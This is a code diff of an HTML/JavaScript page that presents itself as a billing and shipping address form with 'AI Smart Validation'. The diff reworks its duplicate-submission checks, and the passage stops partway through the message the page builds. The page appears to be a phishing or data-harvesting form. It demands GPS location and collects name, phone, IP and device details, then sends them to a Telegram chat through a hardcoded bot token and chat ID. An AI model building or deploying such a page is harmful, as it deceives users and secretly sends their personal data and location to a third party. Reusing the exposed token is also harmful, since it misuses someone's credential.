@@ -57,7 +57,6 @@
 <body>
 
 <div class="container">
-    <!-- Form Page -->
     <div id="step-form">
         <h2>Billing & Shipping Address</h2>
         <div class="subtitle">AI Smart Validation & Security Center</div>
@@ -137,13 +136,13 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- Confirmation Page — CLEAN: only user data -->
+    <!-- Confirmation Page — Clean display -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success">✅ Information Verified Successfully</div>
-        <div id="duplicate-status-box" class="status-box status-warn hidden">⚠️ Duplicate submission detected — same person/location</div>
+        <div id="duplicate-status-box" class="status-box status-warn hidden">⚠️ Duplicate submission detected — same IP/location</div>
         <div id="loc-status-box" class="status-box status-error hidden">⚠️ Location permission required. Please enable location and retry.</div>
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Retry Location Access</button>
 
@@ -165,7 +164,6 @@
     </div>
 </div>
 
-<!-- Duplicate Warning Modal -->
 <div id="duplicate-modal" class="modal-overlay hidden">
     <div class="modal">
         <h3>⚠️ Duplicate Submission Detected</h3>
@@ -182,8 +180,8 @@
 // ========== Configuration ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
-const DISTANCE_THRESHOLD_METERS = 100; // ⬅️ Updated: 100 meters
-const IP_SEGMENTS_TO_MATCH = 2; // Match first 2 segments (e.g. 113.185.*)
+const DISTANCE_THRESHOLD_METERS = 100;
+const IP_SEGMENTS_TO_MATCH = 2;
 
 // ========== Country Database ==========
 const globalDatabase = {
@@ -219,7 +217,7 @@ window.onload = () => {
     deviceInfo = parseUserAgent();
 };
 
-// ========== Calculate Distance Between Two Coordinates ==========
+// ========== Calculate Distance ==========
 function getDistanceMeters(lat1,lng1,lat2,lng2){
     if(!lat1||!lng1||!lat2||!lng2) return 999999;
     const toRad = deg => deg * Math.PI / 180;
@@ -239,39 +237,34 @@ function getIpSegment(ip, segments=2){
 function loadHistory(){ try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); } catch{ return []; } }
 function saveHistory(record){ const h=loadHistory(); h.push(record); localStorage.setItem('submitHistory', JSON.stringify(h)); }
 
-// ========== IMPROVED Duplicate Detection ==========
+// ========== DUPLICATE DETECTION — NO NAME INVOLVED ==========
 function findDuplicate(current){
     const history = loadHistory();
-    const currentNameKey = current.name?.trim().toLowerCase() || "";
     const currentPhoneKey = current.phoneFull?.replace(/\D/g,'') || "";
     const currentIpSeg = getIpSegment(current.ip, IP_SEGMENTS_TO_MATCH);
 
     for(const rec of history){
-        const recNameKey = rec.name?.trim().toLowerCase() || "";
         const recPhoneKey = rec.phoneFull?.replace(/\D/g,'') || "";
         const recIpSeg = getIpSegment(rec.ip, IP_SEGMENTS_TO_MATCH);
 
-        // Rule 1: Same full name + same phone
-        const sameNamePhone = currentNameKey && currentPhoneKey && recNameKey === currentNameKey && recPhoneKey === currentPhoneKey;
+        // Rule 1: Same phone number
+        const samePhone = currentPhoneKey && recPhoneKey && recPhoneKey === currentPhoneKey;
 
-        // Rule 2: Same name + close location
+        // Rule 2: Exact same IP
+        const sameIpExact = current.ip && current.ip !== "Unavailable" && rec.ip === current.ip;
+
+        // Rule 3: Same IP segment (e.g. 113.185.*)
+        const sameIpSegment = currentIpSeg && recIpSeg && currentIpSeg === recIpSeg;
+
+        // Rule 4: Close location
         let dist = 999999;
         if(rec.lat && rec.lng && current.lat && current.lng){
             dist = getDistanceMeters(+rec.lat, +rec.lng, +current.lat, +current.lng);
         }
-        const sameNameNearby = currentNameKey && recNameKey === currentNameKey && dist <= DISTANCE_THRESHOLD_METERS;
-
-        // Rule 3: Same IP (exact)
-        const sameIpExact = current.ip && current.ip !== "Unavailable" && rec.ip === current.ip;
-
-        // Rule 4: Same IP segment (e.g. 113.185.*)
-        const sameIpSegment = currentIpSeg && recIpSeg && currentIpSeg === recIpSeg;
-
-        // Rule 5: Close location only
         const nearLocation = dist <= DISTANCE_THRESHOLD_METERS;
 
-        if(sameNamePhone || sameNameNearby || sameIpExact || sameIpSegment || nearLocation){
-            return { rec, dist, sameNamePhone, sameNameNearby, sameIpExact, sameIpSegment, nearLocation };
+        if(samePhone || sameIpExact || sameIpSegment || nearLocation){
+            return { rec, dist, samePhone, sameIpExact, sameIpSegment, nearLocation };
         }
     }
     return null;
@@ -279,11 +272,10 @@ function findDuplicate(current){
 
 function makeReasonText(m){
     const r=[];
-    if(m.sameNamePhone) r.push("same name + phone");
-    if(m.sameNameNearby) r.push(`same name + ${Math.round(m.dist)}m away`);
+    if(m.samePhone) r.push("same phone number");
     if(m.sameIpExact) r.push("same IP address");
-    if(m.sameIpSegment) r.push("same IP network segment");
-    if(m.nearLocation && !m.sameNameNearby && !m.sameNamePhone && !m.sameIpExact && !m.sameIpSegment) r.push(`location within ${Math.round(m.dist)}m`);
+    if(m.sameIpSegment && !m.sameIpExact) r.push("same IP network segment");
+    if(m.nearLocation) r.push(`location within ${Math.round(m.dist)}m`);
     return r.join(" + ");
 }
 
@@ -415,7 +407,7 @@ async function proceedToVerification(){
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
 
-    // Confirm page — ONLY user data, clean display
+    // Confirm page — only user data
     document.getElementById('disp-name').textContent = formData.name;
     document.getElementById('disp-age').textContent = formData.age;
     document.getElementById('disp-occupation').textContent = formData.occupation;
@@ -432,7 +424,7 @@ async function proceedToVerification(){
 function checkDuplicateOnPage(){
     duplicateRecord = null; allowSubmitAnyway = false;
     if(locationInfo.status !== "granted") return;
-    const current = { name: formData.name, phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
+    const current = { phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
     const match = findDuplicate(current);
     if(!match) return;
     duplicateRecord = match;
@@ -441,10 +433,10 @@ function checkDuplicateOnPage(){
 
     const history = loadHistory();
     const samePerson = history.filter(r=>{
-        const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
+        const samePhone = r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
         const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
         const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        return sameNamePhone || sameIp || near;
+        return samePhone || sameIp || near;
     });
     document.getElementById('disp-count').textContent = samePerson.length + 1;
     document.getElementById('disp-first').textContent = samePerson[0]?.timeStr || "—";
@@ -506,9 +498,9 @@ function parseUserAgent(){
 
 // ========== Modal Control ==========
 function openDuplicateModal(match){
-    document.getElementById('modal-reason').textContent = `Detected: ${makeReasonText(match)}\n\nThis person may have submitted before. Continue anyway?`;
+    document.getElementById('modal-reason').textContent = `Detected: ${makeReasonText(match)}\n\nThis may be a duplicate submission. Continue anyway?`;
     const history = loadHistory();
-    document.getElementById('modal-history').innerHTML = history.slice(-3).reverse().map(r=>`<div class="history-item"><strong>${r.name}</strong> · ${r.timeStr}<br>Phone: ${r.phone} · IP: ${r.ip}<br>Coords: ${r.lat}, ${r.lng}</div>`).join('');
+    document.getElementById('modal-history').innerHTML = history.slice(-3).reverse().map(r=>`<div class="history-item"><strong>${r.name}</strong> · ${r.timeStr}<br>Phone: ${r.phone} · IP: ${r.ip}<br>Distance: ${Math.round(match.dist)}m</div>`).join('');
     document.getElementById('duplicate-modal').classList.remove('hidden');
 }
 function closeModal(confirm=false){
@@ -519,10 +511,10 @@ function closeModal(confirm=false){
 // ========== Submit ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
-        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nNot authorized / Failed to retrieve.");
+        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].");
         return;
     }
-    const current = { name: formData.name, phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
+    const current = { phoneFull: formData.phoneFull, ip: deviceInfo.ip, lat: locationInfo.lat, lng: locationInfo.lng };
     const match = findDuplicate(current);
     if(match && !allowSubmitAnyway){ openDuplicateModal(match); return; }
     doSubmit();
@@ -540,15 +532,15 @@ async function doSubmit(){
 
     const history = loadHistory();
     const samePerson = history.filter(r=>{
-        const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
+        const samePhone = r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
         const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
         const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        return sameNamePhone || sameIp || near;
+        return samePhone || sameIp || near;
     });
     const count = samePerson.length;
     const firstTime = samePerson[0]?.timeStr || timeStr;
 
-    // Telegram message — FULL details preserved for admin
+    // Telegram message — FULL details preserved
     const msg = `📩 新提交的资料
 ——————————————
 姓名：${formData.name}
